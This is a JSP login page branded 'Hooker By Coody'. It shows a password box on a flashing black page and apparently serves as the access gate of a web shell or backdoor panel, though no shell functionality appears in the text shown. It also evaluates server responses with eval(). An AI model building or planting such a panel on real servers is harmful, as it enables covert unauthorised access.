<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Hooker By Coody - ${currIp}</title>
<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
<script>
	(function() {
		$('.tests').fadeOut(250).fadeIn(250);
		setTimeout(arguments.callee, 500);
	})();
	function ti() {
		setTimeout('ti()', 100);
		var v = '#' + Math.floor(Math.random() * 900000).toString();
		document.getElementById('id1').style.color = v;
	}
	ti();
	function ajaxlogin() {
		$("#Submit").attr({
			"disabled" : "disabled"
		});
		$.ajax({
			type : "POST",
			dataType : 'text',
			data : $("#loginForm").serialize(),
			success : function(data) {
				$("#Submit").removeAttr("disabled");
				var json=eval("("+data+")");
				if(json.code==0){
					$("#msg").html("");
					location.reload(true);
				}else{
					$("#msg").html("密码有误");
				}
			},
			error : function() {
				$("#Submit").removeAttr("disabled");
				$("#msg").html("系统繁忙！");
			},
		});
		$("#pass").val("");
		$("#msg").show();
	}
</script>
<style type="text/css">
input {
	border-top-width: 1px;font-weight: bold;border-left-width: 1px;font-size: 11px;border-left-color: #dddddd;background: #000000;border-bottom-width: 1px;border-bottom-color: #dddddd;color: #dddddd;border-top-color: #dddddd;font-family: verdana;border-right-width: 1px;border-right-color: #dddddd;
}
</style>
<body style='background:#000000'>
	<div align='center'>
		<p style='height:50px'></p>
		<span
			style='font-family:楷体, 楷体_utf-8;font-size:108px;font-style:italic;font-weight:bold;display:inline-block;color:white;text-shadow:1px 0 4px #ff0000,0 1px 4px #ff0000,0 -1px 4px #ff0000,-1px 0 4px #ff0000;filter:glow(color=#ff0000,strength=3)'
			id='id1'>By:Coody</span>
		<div class='tests'
			style='background:url(http://img.25pp.com/uploadfile/soft/images/2015/0315/20150315024729560.jpg@230w_230h); background-repeat:no-repeat; background-position:center'
			align='center'>
			<p style='height:200px'></p>
		</div>
		<div style='width:400px;padding:32px; align=left'>
			<br>
			<form action='' method='post' id="loginForm" onsubmit="return false;">
				<b><span
					style='color:white;display:inline-block;text-shadow:1px 0px 4px #c00000, 0px 1px 4px #c00000, 0px -1px 4px #c00000, -1px 0px 4px #c00000'>PassWord：</span></b>
				<input name='pass'id='pass' type='password' size='22'
					onclick="$('#msg').hide()" onkeydown="if(event.keyCode==13) ajaxlogin();"/> <input type='button'
					onclick="ajaxlogin()" value='submit' id="Submit" /> <input
					name="action" value="login" type="hidden" />
			</form>
			<span id="msg" style="font-size:14px;font-family:隶书;color:rgb(242, 242, 242)"></span>
		</div>
	</div>
</body>
</html>